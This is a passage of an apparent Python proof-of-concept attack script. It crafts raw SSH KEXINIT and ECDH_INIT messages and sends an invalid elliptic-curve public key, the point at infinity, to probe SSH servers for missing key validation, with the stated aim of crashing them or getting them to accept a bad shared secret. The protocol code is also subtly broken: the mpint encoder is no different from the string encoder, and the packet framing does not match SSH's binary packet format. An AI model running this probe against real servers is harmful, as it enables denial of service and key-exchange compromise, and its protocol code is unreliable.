def ssh_string(data: bytes) -> bytes:
    """Encode data as an SSH string (length-prefixed)."""
    return struct.pack(">I", len(data)) + data

def ssh_mpint(data: bytes) -> bytes:
    """Encode data as an SSH mpint (length-prefixed, big-endian integer)."""
    return struct.pack(">I", len(data)) + data

def craft_kexinit(kex_algos: list) -> bytes:
    """Craft a minimal SSH_MSG_KEXINIT message."""
    cookie = b'\x00' * 16
    kex_algos_str = ",".join(kex_algos)
    server_host_key_algos = ssh_string(b"ssh-ed25519,ecdsa-sha2-nistp256")
    encryption_algos_ctos = ssh_string(b"aes128-ctr")
    encryption_algos_stoc = ssh_string(b"aes128-ctr")
    mac_algos_ctos = ssh_string(b"hmac-sha2-256")
    mac_algos_stoc = ssh_string(b"hmac-sha2-256")
    compression_algos_ctos = ssh_string(b"none")
    compression_algos_stoc = ssh_string(b"none")
    lang_ctos = ssh_string(b"")
    lang_stoc = ssh_string(b"")
    first_kex_follows = b"\x00"
    reserved = b"\x00"
    
    payload = (
        cookie +
        ssh_string(kex_algos_str.encode()) +
        server_host_key_algos +
        encryption_algos_ctos +
        encryption_algos_stoc +
        mac_algos_ctos +
        mac_algos_stoc +
        compression_algos_ctos +
        compression_algos_stoc +
        lang_ctos +
        lang_stoc +
        first_kex_follows +
        reserved
    )
    return bytes([SSH_MSG_KEXINIT]) + ssh_string(payload)

def craft_malicious_ecdh_init() -> bytes:
    """
    Craft SSH_MSG_KEX_ECDH_INIT with a malicious public key.
    
    Vulnerability: Unvalidated Elliptic Curve Public Key
    Attack: Send the point at infinity (0x00) or a point not on the curve.
    RFC 5656 Section 4 mandates validation. If missing, the server may crash,
    leak information, or accept an invalid shared secret.
    """
    # The point at infinity in SEC1 encoding is a single byte 0x00
    # This is a valid encoding for the identity element but MUST be rejected
    # as a public key in ECDH per RFC 5656 and SEC1.
    malicious_public_key = b"\x00"  # Point at Infinity
    
    # SSH_MSG_KEX_ECDH_INIT format:
    # byte     SSH_MSG_KEX_ECDH_INIT
    # string   Q_C, client's ephemeral public key octet string
    return bytes([SSH_MSG_KEX_ECDH_INIT]) + ssh_string(malicious_public_key)

def send_and_receive(sock, data):
    """Send data and receive response."""
    sock.sendall(data)
    # Read length prefix
    length_data = sock.recv(4)
    if len(length_data) < 4:
        return None
    msg_len = struct.unpack(">I", length_data)[0]
    # Read message body
    msg_body = b""
    while len(msg_body) < msg_len:
        chunk = sock.recv(msg_len - len(msg_body))
        if not chunk:
            break
        msg_body += chunk
    return msg_body

